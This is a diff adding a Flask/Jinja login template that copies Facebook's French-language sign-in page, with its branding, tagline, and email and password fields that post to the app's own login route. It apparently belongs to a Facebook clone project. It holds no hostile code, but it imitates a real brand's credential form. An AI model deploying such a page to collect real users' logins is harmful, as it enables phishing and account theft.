@@ -1,0 +1,24 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="login-container">
+    <div class="login-left">
+        <h1>facebook</h1>
+        <p>Avec Facebook, partagez et restez en contact avec votre entourage.</p>
+    </div>
+    <div class="login-form-container">
+        <div class="login-card">
+            <form method="POST" action="{{ url_for('login') }}">
+                <input type="text" class="form-control" name="username" placeholder="Adresse e-mail ou numéro de tél." required>
+                <input type="password" class="form-control" name="password" placeholder="Mot de passe" required>
+                <button type="submit" class="btn btn-primary btn-login">Se connecter</button>
+                <div class="divider"></div>
+                <a href="{{ url_for('register') }}" class="btn btn-success btn-register">Créer un compte</a>
+            </form>
+        </div>
+        <div class="text-center mt-3">
+            <small><a href="#" class="text-decoration-none">Mot de passe oublié ?</a></small>
+        </div>
+    </div>
+</div>
+{% endblock %}
